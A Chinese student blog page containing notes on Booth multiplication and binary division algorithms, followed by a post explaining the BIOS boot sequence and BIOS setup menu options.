<p>不妨令<span class="math inline">\(Y\)</span>最后再加一位<span
class="math inline">\(Y_{-n}=0\)</span>反正小数部分最后添0不会影响小数大小</p>
<p>那么 <span class="math display">\[
\begin{aligned}
Y&amp;=2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+...+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(Y_{-n}-Y_{-(n-1)})\\
&amp;=\sum_{i=-(n-1)}^{0}2^{i}\times (Y_{i-1}-Y_i)
\end{aligned}
\]</span> 好了,现在<span
class="math inline">\(Y\)</span>经过各种调教,已经连同符号位都可以一起计算了
<span class="math display">\[
\begin{aligned}
X\times Y&amp;=X\times \sum_{i=-(n-1)}^{0}2^{i}\times (Y_{i-1}-Y_i)\\
&amp;=\sum_{i=-(n-1)}^{0}[2^{i}\times (Y_{i-1}-Y_i)\times X]
\end{aligned}
\]</span> 这是一种啥形式呢?每次<span
class="math inline">\(X\)</span>都看<span
class="math inline">\(Y_{i-1}Y_{i}\)</span>的脸色行事,<span
class="math inline">\(2^i\)</span>是这俩哥们儿的权重.此时不再考虑<span
class="math inline">\(Y_{i-1},Y_{i}\)</span>的权重区别了,因为<span
class="math inline">\(2^i\)</span>是两个家伙的共同的权重,两者权重的二倍关系,已经应用在在刚才的转化过程中</p>
<table>
<thead>
<tr>
<th><span class="math inline">\(Y_{i-1}Y_{i}\)</span></th>
<th><span class="math inline">\(Y_{i-1}-Y_{i}\)</span></th>
<th>行为</th>
</tr>
</thead>
<tbody>
<tr>
<td>00</td>
<td>0</td>
<td>啥也不干</td>
</tr>
<tr>
<td>01</td>
<td>-1</td>
<td>-X</td>
</tr>
<tr>
<td>10</td>
<td>1</td>
<td>+X</td>
</tr>
<tr>
<td>11</td>
<td>0</td>
<td>啥也不干</td>
</tr>
</tbody>
</table>
<p>在一个回合内应该干的事情:</p>
<p>从<span
class="math inline">\(i=-(n-1)\)</span>这个最低权位开始算,每次根据<span
class="math inline">\(Y\)</span>的最低两位确定行为,然后右移一位,将<span
class="math inline">\(Y_i\)</span>移出扬了,刚才的<span
class="math inline">\(Y_{i-1}\)</span>现在是最低位.</p>
<p>每个回合开始前,将上回合的中间过程位向量右移一位,作用是给先前的计算结果都降权2</p>
<h3 id="硬件实现">硬件实现</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617081422674.png"
alt="image-20220617081422674" />
<figcaption aria-hidden="true">image-20220617081422674</figcaption>
</figure>
<p>这个图应该怎样理解呢?</p>
<p>D和A两个寄存器共同组成中间过程位向量,最右边有一个<span
class="math inline">\(A_{-1}\)</span>是附加位,这个刚才我们也分析过了,小数部分最后随便添0不影响结果大小</p>
<p>一开始的时候,乘数<span
class="math inline">\(Y\)</span>符号位和数值位都放在A中,小数点扬了,<span
class="math inline">\(Y\)</span>的最低位落到<span
class="math inline">\(A_0\)</span>,此时<span
class="math inline">\(A_{-1}=0,D=0\)</span></p>
<p>右移的时候<span
class="math inline">\(A_{-1}\)</span>也要参与,刚才的<span
class="math inline">\(A_0\)</span>就移入<span
class="math inline">\(A_{-1}\)</span>,一共右移多少次呢?将A中的乘数刚好扬了为止,比如<span
class="math inline">\(Y=1.0011\)</span>则右移5次(符号位和数值为没有区别)</p>
<p><span
class="math inline">\(A_0A_{-1}\)</span>接入一个二四译码器,而实际上一共有三种情况,啥也不干,+X,-X,怎么把这三种情况转化成机器能听懂的语言呢?</p>
<p>当<span class="math inline">\(A_0A_{-1}=00\)</span>则选择器选通<span
class="math inline">\(D_0=0\)</span></p>
<p>当<span class="math inline">\(A_0A_-1=01\)</span>则选择器选通<span
class="math inline">\(D_1={B}\)</span></p>
<p>当<span class="math inline">\(A_0A_{-1}=10\)</span>则选择器选通<span
class="math inline">\(D_2=\overline {B}\)</span>,此时<span
class="math inline">\(A_0\overline
A_{-1}\)</span>接入与门,与门接到全加器最低位,作用是对<span
class="math inline">\(B\)</span>的取反再+1得到补码</p>
<p>当<span class="math inline">\(A_0A_{-1}=11\)</span>则选择器选通<span
class="math inline">\(D_3=0\)</span></p>
<p>选通信号都输入全加器</p>
<p>中间过程位向量<span
class="math inline">\([D:A]\)</span>在右移的时候带符号右移,即<span
class="math inline">\(CF\)</span>跟着移入最高位,并且右移之后<span
class="math inline">\(CF\)</span>状态不变</p>
<h3 id="手算模拟">手算模拟</h3>
<p><span
class="math inline">\(X=0.1010,Y=-0.1101\)</span>,计算两个数的补码一位布斯乘法</p>
<p><span class="math inline">\([X]_补=00.1010\)</span></p>
<p><span class="math inline">\([Y]_补=11.0011\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617081351470.png"
alt="image-20220617081351470" />
<figcaption aria-hidden="true">image-20220617081351470</figcaption>
</figure>
<p>最终没有特判符号位,而是符号位已经在CF中了</p>
<p>经过刚才的分析,现在<span
class="math inline">\(A_{-1}\)</span>就具有实际意义了,不再是一个根据人的意愿补上的一位了</p>
<p>每个回合,被乘数都根据<span
class="math inline">\(A_{0}A_{-1}\)</span>的脸色行事,比如当<span
class="math inline">\(A_0A_{-1}=10\)</span>时,应该-X</p>
<p>而这似乎和我们一开始推导算法的时候相反</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617084040120.png"
alt="image-20220617084040120" />
<figcaption aria-hidden="true">image-20220617084040120</figcaption>
</figure>
<p>我们推导的是当<span
class="math inline">\(Y_{i-1}Y_i=10\)</span>时+X</p>
<p>实际上令i=0得到<span
class="math inline">\(Y_{-1}Y_0=10\)</span>调个个儿就得到<span
class="math inline">\(Y_0Y_{-1}=01\)</span></p>
<p>因此<span
class="math inline">\(A_{0}A_{-1}=10\)</span>实际对应的是<span
class="math inline">\(Y_{i-1}Y_i=01\)</span>的情况,行为是-X</p>
<p>这里一定要分清关系</p>
<blockquote>
<p>在手算模拟的时候,只需要用<span
class="math inline">\(A_{-1}-A_0\)</span>,根据结果的正负决定加减X,<span
class="math inline">\(A_{-1}-A_0=1\)</span>则+X</p>
</blockquote>
<p>关于手算时符号位为啥要两位?</p>
<p>实际上机器只需要一位,这一位就有实际意义,即CF的值</p>
<p>然而由于计算过程中需要带符号右移一位,这样符号位是11时右移一位变成01,我们模拟时一看符号位还有1,于是高位填充1,修正成11</p>
<p>即最高位是防止人计算的过程中犯糊涂用的</p>
<p>并且符号位两位起到了双符号位判断溢出的作用,如果计算过程中,出现了两个符号位不同的情况,啃腚是算错了</p>
<h2 id="原码除法">原码除法</h2>
<h3 id="手算">手算</h3>
<p>约定规则</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617085630330.png"
alt="image-20220617085630330" />
<figcaption aria-hidden="true">image-20220617085630330</figcaption>
</figure>
<p>这个规则第一条我就绷不住了,就算是两个定点纯小数,被除数的绝对值也不一定比除数小吧,比如<span
class="math inline">\(0.1111\div 0.0111\)</span>,整数也是如此</p>
<p>那为啥要这样规定呢?为了保证两个定点纯小数的除法结果还是一个定点纯小数,</p>
<p>一旦被除数的绝对值大,则至少结果的整数部分可以商出一个1来,这时候运算结果就是定点既有整数也有小数了</p>
<p>而我们希望的是不使用整数部分,硬件上根本就不允许整数部分有意义,而是只保留小数部分</p>
<p>比如<span class="math inline">\(0.1111\div
0.0111=1.00010001..\)</span></p>
<p>而硬件是这样计算的:<span class="math inline">\(1111\div
0111=00010001\)</span>,因为硬件就认为这个结果只可能是小数</p>
<p>下面通过列竖式的方法计算<span
class="math inline">\(X=0.1011\)</span>,<span
class="math inline">\(Y=0.1101\)</span>两数的除法,推导适用于机器的算法</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617090654188.png"
alt="image-20220617090654188" />
<figcaption aria-hidden="true">image-20220617090654188</figcaption>
</figure>
<p>由于已经保证被除数绝对值小,因此结果的整数个位必定商0</p>
<p>人类在计算竖式的过程中有一个特点---人类会<strong>试商</strong>,啥意思呢?</p>
<p>在商了前两个1之后,下面要计算<span class="math inline">\(1010\div
1101\)</span>,</p>
<p>人类一看除数大,商1就过分了,剪出来一个负数,因此人类此时会商0.</p>
<blockquote>
<p>试商我们从小学就学过了,那时候是在十进制下,每次试商都要按照9,8,7,...,2,1,0这种顺序试商(熟练了可以用二分结果试商),直到试到某个值n,此时用n去乘被除数得到的积刚好比中间结果小或者相等整除,并且商<span
class="math inline">\(n+1\)</span>刚好比中间结果大,那么n就是该位应该上的商</p>
<p>而现在对于二进制,每一位只有两种状态0或者1,我们只需要试商1,成功则商1,失败则商0</p>
<p>本质思想是相同的,只不过二进制中商0和商1是相互对立事件,而十进制中商0和商1是互不相容事件,因为十进制下还可以商2,3,等等</p>
</blockquote>
<p>然而机器怎么试商呢?机器进行的每步运算都要改变硬件状态,试商会直接把商写进中间过程位向量,他只有一次机会,不允许试.而人类可以在草稿上试商然后将准确的商写道卷子上</p>
<h3 id="恢复余数法">恢复余数法</h3>
<p>虽然机器不能试商,但是机器可以知道的是,自己尚一个1,有没有商的太过分了,</p>
<p>商1,则用中间结果去减被除数,如果减出来结果是个负数,机器就能根据符号位知道发生了什么.</p>
<p>他知道刚才商的太狠了,本应该下手轻点的.</p>
<p>于是他可以反悔,刚才商1导致中间结果负了,那么现在改商0,中间结果再加一个被除数还原到商1之前的情况,刚才商的1不算数.这个过程叫做"<strong>恢复余数</strong>"</p>
<p>手算模拟<span
class="math inline">\(X=-0.10001011除以Y=0.0110\)</span>的过程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617093100955.png"
alt="image-20220617093100955" />
<figcaption aria-hidden="true">image-20220617093100955</figcaption>
</figure>
<p>最终结果咋看呢?</p>
<p>看最后一行,</p>
<p>商的绝对值是<span
class="math inline">\(0.1001\)</span>,最前面这个0肯定是0,这就是整数位个位的商,由于被除数比除数小,因此这一位必定为0,商的结果根据除数和被除数的符号位异或决定,因此商是<span
class="math inline">\(1.1001\)</span></p>
<p>余数的绝对值是<span class="math inline">\(0.1101\times
2^{-4}\)</span>,符号应该和商一致,因此余数是<span
class="math inline">\(1.1101\times 2^{-4}\)</span></p>
<p>这里<span
class="math inline">\(2^{-4}\)</span>怎么来的呢?余数实际上是中间过程位向量最开始时的低四位经过运算和左移得到的,其本来的权就是<span
class="math inline">\(2^{-4}\)</span></p>
<p>为啥乘法的时候需要中间过程右移,而除法的时候需要中间过程左移呢?</p>
<p>在做除法的时候我们都是从高位往低位商,而做乘法的时候是从低位向高位乘,两种运算的顺序相反</p>
<p>做除法时早商应该比晚商权重高,通过左移,越早的商越高,权重越大</p>
<p>从图上可以发现一个问题,够减的时候,中间结果左移,不够减的时候,恢复余数,不左移</p>
<p>怎么让机器知道够不够减?前面分析的是根据符号位.</p>
<p>确实根据符号位可以知道这个事情,但是知道了怎么处理呢?</p>
<p>哪个元件可以根据CF的状态,决定给ALU送什么数呢?这个过程对硬件来说太抽象,不容易实现</p>
<p>想法总是千奇百怪,但是真到落地实现的时候,直接摔死</p>
<blockquote>
<p>这让我想到大二上学微信小程序的时候,我竟然痴心妄想整一个支持markdown,用缩进表示分支的思维导图(Flowchart).属实是高估自己的编程能力和知识储备了</p>
<p>然而本学期tx学写游戏的时候,一些听上去天马行空的事情,都被库函数实现了,只能说,人定胜天</p>
</blockquote>
<h3 id="加减交替法">加减交替法</h3>
<p>由于恢复余数法不方便实现,考虑一个让硬件舒服的方法</p>
<p>还是从恢复余数法中吸取教训</p>
<p>不妨定义一个说法"回合",感觉这像是一个状态机</p>
<p>每一回合都要经过,恢复余数(这算是上回合留下的屁股),左移一位,上本次的商,这几个过程</p>
<p>如果上回合留下了一个屁股,即上回合商1导致中间过程负了,本回合需要首先加上被除数恢复余数,并且上回合的商1作废,改为0,然后左移一位,让上回合的商升权2,然后直接商1,把屁股留给下一个回合</p>
<p>如果上回合没有留下屁股,即上回合商1,中间过程减去被除数得到正数,则不需要恢复余数,直接左移让上回合的商1升权2,然后直接商1把本回合的屁股留给下一个回合</p>
<p>好的, 现在考虑,</p>
<p>本回合需要处理上回合的屁股,首先R(中间过程结果)+Y(被除数),</p>
<p>然后左移一位,<span class="math inline">\(2(R+Y)\)</span></p>
<p>然后处理本回合事物,直接商1有<span
class="math inline">\(2(R+Y)-Y=2R+Y\)</span></p>
<p>这不就相当于刚才不擦屁股,直接余数R左移,然后加上Y吗</p>
<p>本回合不用擦上回合的屁股</p>
<p>直接R左移一位变成2R</p>
<p>然后处理本回合事物,直接商1有<span
class="math inline">\(2R-Y\)</span></p>
<p>综上,每个回合要么<span class="math inline">\(2R+Y\)</span>,要么<span
class="math inline">\(2R-Y\)</span>,总共两种状态,</p>
<p>通过中间过程符号位决定本回合采用哪种状态</p>
<p>啥时候上商呢?在回合开始还没有位移的时候,根据中间过程的符号上商,</p>
<p>中间过程符号为0则商1,中间过程符号为1则商0</p>
<p>这就好实现了,</p>
<p>2R相当于本回合上来就中间过程左移,</p>
<p>中间过程符号位作为地址端接到2选1选择器,</p>
<p>符号为1则<span
class="math inline">\(-Y\)</span>选通,并且还要向ALU最低位加一个1,实现加补操作</p>
<p>符号为0则<span class="math inline">\(+Y\)</span>选通</p>
<p>硬件实现如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617102424109.png"
alt="image-20220617102424109" />
<figcaption aria-hidden="true">image-20220617102424109</figcaption>
</figure>
<p>怎么解读这个框图呢?</p>
<p>以<span
class="math inline">\(X=-0.10001011,Y=0.1110\)</span>为例,</p>
<p><span class="math inline">\(|X|=0.10001011,|Y|=0.1110\)</span></p>
<p>一开始<span class="math inline">\(|X|\)</span>放在D和A中</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617103310655.png"
alt="image-20220617103310655" />
<figcaption aria-hidden="true">image-20220617103310655</figcaption>
</figure>
<p>第一回合,本回合比较特殊,当前中间过程就是被除数(绝对值),符号为正,但是商0</p>
<p>然后左移,刚才的符号位0取反后移入<span
class="math inline">\(A_0\)</span>,<span
class="math inline">\(A_0=1\)</span>决定本回合-Y,即加Y补</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104129464.png"
alt="image-20220617104129464" />
<figcaption aria-hidden="true">image-20220617104129464</figcaption>
</figure>
<p>第二回合,当前中间过程为<span
class="math inline">\(00&#39;00110110&#39;\)</span>,符号为正,商1</p>
<p>左移一位,符号位0取反之后移入<span
class="math inline">\(A_0\)</span>,<span
class="math inline">\(A_0=1\)</span>决定本回合<span
class="math inline">\(-|Y|\)</span>,即加补</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104639433.png"
alt="image-20220617104639433" />
<figcaption aria-hidden="true">image-20220617104639433</figcaption>
</figure>
<p>第三回合,当前中间过程为<span
class="math inline">\(11&#39;10001101\)</span>,符号为负,商1</p>
<p>左移一位,符号位1取反得0之后移入<span
class="math inline">\(A_0\)</span>,<span
class="math inline">\(A_0=0\)</span>决定本回合应该<span
class="math inline">\(+|Y|\)</span></p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104826502.png"
alt="image-20220617104826502" />
<figcaption aria-hidden="true">image-20220617104826502</figcaption>
</figure>
<p>以此类推</p>
<p>最终结果怎么看呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617105339564.png"
alt="image-20220617105339564" />
<figcaption aria-hidden="true">image-20220617105339564</figcaption>
</figure>
<p>商这一列从上到下就是商,最上面这个0不用管,每次都是0,原因是我们故意控制被除数绝对值比除数小</p>
<p>或者看最下面这一行最右边01001,就是商这一列不断右移得到的</p>
<p>余数绝对值<span class="math inline">\(0.1101\times
2^{-4}\)</span>,符号和商相同,都要看被除数和除数的符号异或</p>
<h2 id="补码除法">补码除法</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617110237294.png"
alt="image-20220617110237294" />
<figcaption aria-hidden="true">image-20220617110237294</figcaption>
</figure>
<p>这句话我看了好半天才看明白,</p>
<p>"与乘法运算的情况类似,有时也会<strong>迂回</strong>到补码乘法"</p>
<p>好家伙算个数还有迂回战术,就gx那三眼一板,一丝不苟的治学态度,我不大相信他能整出这样的词儿来</p>
<p>看了好几遍发现没有"回",就一个"迂",</p>
<p>是在说用补码做除法的人都<strong>迂</strong>吗?想到这里我都笑出了声,</p>
<p>用迂字骂人真有感觉,尤其和13合起来,"迂13!",这山东话绝对有气势</p>
<blockquote>
<p>巧了宿舍群就这样命名的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617110800214.png"
alt="image-20220617110800214" />
<figcaption aria-hidden="true">image-20220617110800214</figcaption>
</figure>
</blockquote>
<p>应该是错字,本来想用"用"字的</p>
<p>绷不住了</p>
<h3 id="补码除法状态机">补码除法状态机</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617111542233.png"
alt="image-20220617111542233" />
<figcaption aria-hidden="true">image-20220617111542233</figcaption>
</figure>
<p><strong>状态</strong>就是被除数或者说余数,或者说中间过程位向量的符号状态,所有的状态转移都是根据该符号位决定的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/15/%E8%B5%B7%E6%9D%A5,%E4%B8%8D%E6%84%BF%E5%81%9A%E6%9D%BF%E7%A0%96%E5%84%BF%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/15/%E8%B5%B7%E6%9D%A5,%E4%B8%8D%E6%84%BF%E5%81%9A%E6%9D%BF%E7%A0%96%E5%84%BF%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA/" class="post-title-link" itemprop="url">起来,不愿作板儿砖的计算机</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-15 00:34:00" itemprop="dateCreated datePublished" datetime="2022-06-15T00:34:00+08:00">2022-06-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-16 00:51:42" itemprop="dateModified" datetime="2022-06-16T00:51:42+08:00">2022-06-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="起来不愿作板儿砖的计算机">起来,不愿作板儿砖的计算机</h1>
<p>"pull oneself up by one's bootstraps"拉着自己的鞋带站起来</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/439512-b9c6066addb32acd.png" /></p>
<h2 id="bios">BIOS</h2>
<h3 id="bios做的事情">BIOS做的事情</h3>
<blockquote>
<ol type="1">
<li>Power is turned on.</li>
<li>The CPU hands control over to the BIOS.</li>
<li>The BIOS runs a program called Power-On Self Test, which determines
how much memory the computer has and then confirms that critical
low-level hardware is operating correctly. Any errors are indicated by
sequences of audible beeps. After this, the BIOS disables all
configurable devices.</li>
<li>The BIOS identifies all of the computer's peripheral devices, such
as hard drives and expansion cards. It first looks for plug-and-play
devices and assigns a number to each, but it doesn't enable the devices
at this time.</li>
<li>The BIOS locates the primary boot or initial program load (IPL)
device. This is usually a storage device such as a hard drive, floppy
drive or CD-ROM that holds the operating system, but it can be a network
card connected to a server. The BIOS also locates all of the system's
secondary IPL devices.</li>
<li>The BIOS builds a system resource table, assigning conflict-free
resources according to which devices it found and the configuration data
stored in nonvolatile RAM.</li>
<li>It selects and enables the primary input (keyboard) and output
(monitor) devices, so that if trouble occurs during the boot process,
the BIOS can display a recovery screen and allow the user to select a
stored configuration of system settings that are known to work. The BIOS
captured these settings the last time the computer booted successfully,
and it stores them in nonvolatile RAM.</li>
<li>It scans for non-plug-and-play devices, including the Peripheral
Component Interconnect (PCI) bus, and adds data from their ROMs to its
resource table.</li>
<li>The BIOS resolves device conflicts and configures the chosen boot
device.</li>
<li>It enables plug-and-play devices by calling their option ROMs with
appropriate parameters.</li>
<li>It starts the bootstrap loader. If, for some reason, the default IPL
fails to load the operating system, the BIOS tries the next IPL device
in the list.</li>
<li>The IPL device loads the operating system into memory.</li>
<li>The BIOS hands over control to the operating system, which may make
other resource assignments.</li>
</ol>
</blockquote>
<p>1.上电</p>
<p>2.CPU将控制交给BIOS</p>
<p>3.BIOS开始上电自检,用来检查计算机内存大小,检查底层硬件是否正常运作.</p>
<p>只要有错就用蜂鸣器发出相应的叫声.</p>
<p>此后,BIOS禁用所有可配置设备(刚才检查的时候算是暂时启用了一下)</p>
<blockquote>
<p>我装在commando上的kali物理机每次开机都会用最大声音"Bee"一下,不太聪明的亚子</p>
</blockquote>
<p>4.BIOS识别计算机的所有外设,比如硬件驱动器和拓展卡(比如独立网卡独立显卡).</p>
<p>BIOS首先搜索所有即插即用式设备并为每个设备<strong>编号</strong>,但是此时并不将这些设备使能</p>
<p>5.BIOS定位主引导程序或者初始化加载程序设备.这种设备通常是一个存储设备比如硬盘,软盘,或者光驱,该设备上应当编程有操作系统,该设备甚至还可以是连接到一台服务器的网卡(这个有点离谱了)</p>
<p>6.BIOS 建立一张系统资源表，根据它找到的设备和存储在非易失性 RAM
中的配置数据分配无冲突资源。</p>
<p>7.BIOS使能基本输入(键盘)和输出(显示器)设备,如此当此后的启动过程中万一发生错误,BIOS可以打印打印恢复选项屏幕,并且让用户选择一个系统设定,然后BIOS遵旨继续执行.</p>
<p>BIOS会保存最后一次计算机成功启动时的设定,用那一次的设定进行恢复,这些设置被保存在非易失性RAM中</p>
<p>8.BIOS扫描所有<strong>非</strong>即插即用式设备,包括外设总线,并将这些设备的ROM中的数据添加到刚才建立的资源表中</p>
<p>9.BIOS解决设备冲突,确定boot所在的设备</p>
<p>10.BIOS通过使用适当参数,调用即插即用式设备的选项ROM,使能这些设备</p>
<p>11.BIOS启动bootstrap loader.</p>
<p>如果默认的IPL(InitialProgramLoader)(第9步设置的设备)不能装载操作系统,则BIOS尝试列表中的下一个IPL设备</p>
<p>12.IPL设备将操作系统装载进入内存</p>
<p>13.控制权交给操作系统,操作系统将进行其他资源分配</p>
<p>到此计算机启动完毕,BIOS完成使命</p>
<h3 id="bios设置">BIOS设置</h3>
<h4 id="main视图">Main视图</h4>
<p>在我的ubuntu10.04
虚拟机上,开机的时候根据提示按下F2就可以进入BIOS选择阶段</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613140700106.png"
alt="image-20220613140700106" />
<figcaption aria-hidden="true">image-20220613140700106</figcaption>
</figure>
<p>可见BIOS这么小的系统也已经图形化了</p>
<p>在Main视图下,可以修改系统日期时间</p>
<h5 id="legacy-diskette">Legacy Diskette</h5>
<p>设置软驱,都2202年了,不会有人还在用软驱吧,不管他了</p>
<h5 id="primarysecond-masterslave">Primary/Second Master/Slave</h5>
<p>Primary Master/Slave不是"主要大师/奴隶",是设置主IDE的主从通道</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613141246521.png"
alt="image-20220613141246521" />
<figcaption aria-hidden="true">image-20220613141246521</figcaption>
</figure>
<p>IDE是啥?Integrated Drive
Electronics,"把控制器和盘体集成的硬盘驱动器"</p>
<p>我不想下到硬件看看接口是什么样的了,就认为IDE是接硬盘的</p>
<p>如果IDE硬盘接到IDE通道的主通道(Primary)则BIOS将其作为引导盘</p>
<h5 id="keyboard-features">Keyboard Features</h5>
<p>"键盘特性"</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613142143514.png"
alt="image-20220613142143514" />
<figcaption aria-hidden="true">image-20220613142143514</figcaption>
</figure>
<p>NumLock</p>
<p>里面有一个NumLock,数字锁,也就是键盘上最右边的数字小键盘锁,Off则开机自动关闭,不让用数字键,On则开机自动开启.即使这里是Off,也可以在开机时自己按键盘上的NumLock改变状态</p>
<p>Keyboard auto-repeat delay: [1/2 sec]</p>
<p>考虑这么一长串字符你会怎么输入<code>aaaaaaaaaaaaaaaaaaa</code>,是不是按住a一直不放.</p>
<p>有没有注意过,但是按一下a,只会输出一个a,即使手稍微慢一点,也是只会输出一个a,并没有趁机写好几个a,从单输入第一个a到计算机认为需要连续获取输入之间的时间就是这个设置,</p>
<p>这里设为1/2秒,即按下a之后不松开,过半秒之后就获取一长串输入</p>
<p>Keyboard auto-repeat rate: [30/sec]</p>
<p>这个是啥呢?在键盘开始一长串输入后,每秒内输入几个a呢?100个?10个?1000个?</p>
<p>如果是1000,那么一旦Keyboard auto-repeat
delay开关被打开,则眨眼间写入了百八十个a,写太多了,又要长按Backspace退格删除,Keyboard
auto-repeat
delay开关又被打开,呼哧一下删了百八十个a,甚至之前写的东西也退掉了.</p>
<p>显然1000这个数灵敏度太高,在我的windows上大约是20个左右,确切是多少我也不知道,重新开机看看吗,那个时候又没法截图</p>
<p>在这个ubuntu虚拟机上可以看见是30个</p>
<p>这里三个设置是根据用户习惯设置的,为人性化设置的</p>
<h5 id="memory">Memory</h5>
<p>然后展示了两个内存</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613143304212.png"
alt="image-20220613143304212" />
<figcaption aria-hidden="true">image-20220613143304212</figcaption>
</figure>
<p>就让看看,根本不让改</p>
<p>两个内存分别是啥呢?</p>
<p>去中文站点儿查,就给说"System
Memory是系统内存",这傻子都会翻译还tm用你说,什么系统的内存啊?</p>
<h5 id="boot-time-diagnositc-screen">Boot-time Diagnositc Screen</h5>
<p>启动时诊断屏幕,这是个啥呢?</p>
<p>给他改成Enable然后重启看看,开机的时候会有一两秒的这个页面</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613151050418.png"
alt="image-20220613151050418" />
<figcaption aria-hidden="true">image-20220613151050418</figcaption>
</figure>
<p>没有错误的就"Passed"或者"initialized"</p>
<h4 id="advanced视图">Advanced视图</h4>
<p>"高级"</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613151239709.png"
alt="image-20220613151239709" />
<figcaption aria-hidden="true">image-20220613151239709</figcaption>
</figure>
<h5 id="multiprocessor-specification">Multiprocessor Specification</h5>
<p>"多处理器规范"</p>
<p>参考</p>
<p><a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/MultiProcessor_Specification">MultiProcessor
Specification - Wikipedia</a></p>
<p><a
target="_blank" rel="noopener" href="https://pdos.csail.mit.edu/6.828/2008/readings/ia32/MPspec.pdf">MultiProcessor
Specification (mit.edu)</a></p>
<blockquote>
<p>The <strong>MultiProcessor Specification</strong>
(<strong>MPS</strong>) for the <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/X86_architecture">x86
architecture</a> is an <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Open_standard">open standard</a>
describing enhancements to both <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Operating_system">operating
systems</a> and <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Firmware">firmware</a>, which will
allow them to work with x86-compatible processors in a <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Multiprocessing">multi-processor</a>
configuration. MPS covers <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Advanced_Programmable_Interrupt_Controller">Advanced
Programmable Interrupt Controller</a> (APIC) architectures.</p>
<p>Version 1.1 of the specification was released on April 11, 1994.
Version 1.4 of the specification was released on July 1, 1995, which
added extended configuration tables to improve support for multiple PCI
bus configurations and improve expandability.</p>
<p>The <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_kernel">Linux
kernel</a> and <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a> are known to
support the Intel MPS. <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_NT">Windows NT</a> are known
to support MPS 1.1 and <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Windows_2000">Windows 2000</a> or
higher are known to support MPS 1.4. <a
target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/OS/2">OS/2</a> are known to support
MPS 1.1 only. <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Mac_OS_X">Mac OS
X</a> are known to support MPS 1.4 only.</p>
</blockquote>
<p>针对 x86架构的 MultiProcessor
规范(MPS)是一个开放标准，描述了对操作系统和固件的增强，这将允许它们在多处理器配置中与
x86兼容的处理器一起工作。</p>
<p>1.1版本于1994年4月11日发布。1.4版本于1995年7月1日发布，它添加了扩展配置表，以改进对多个
PCI 总线配置的支持，并提高可扩展性。</p>
<p>Linux内核和FreeBSD都是支持英特尔MPS的,</p>
<p>WindowsNT支持1.1版本</p>
<p>Windows2000以及更高版本系统支持1.4版本</p>
